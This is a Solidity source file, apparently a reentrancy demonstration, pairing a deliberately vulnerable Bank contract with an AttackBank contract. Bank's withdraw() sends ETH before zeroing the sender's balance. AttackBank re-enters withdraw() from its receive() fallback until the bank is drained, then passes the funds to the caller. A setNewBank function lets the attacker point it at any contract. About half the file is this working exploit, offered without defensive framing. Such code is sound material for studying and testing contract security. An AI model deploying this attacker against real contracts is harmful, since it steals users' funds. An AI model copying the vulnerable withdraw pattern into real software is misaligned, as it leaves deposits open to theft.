// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

contract Bank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amountToWithdraw = balances[msg.sender];
        require(amountToWithdraw > 0, "user has 0 balance");

        (bool sent, ) = msg.sender.call{value: amountToWithdraw}("");

        require(sent, "Failed to send ETH");

        balances[msg.sender] = 0;
    }

    function getCurrentBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackBank {
    uint256 public MINIMUM_STEP = 1 * 10**16; // 0.01 ETH (//adjust to contract)
    Bank public bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    function setNewBank(address _bank) public {
        bank = Bank(_bank);
    }

    function setMinimumStep(uint256 _newStep) public {
        MINIMUM_STEP = _newStep;
    }

    function attack() public payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (bank.getCurrentBalance() >= MINIMUM_STEP) {
            bank.withdraw();
        }
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
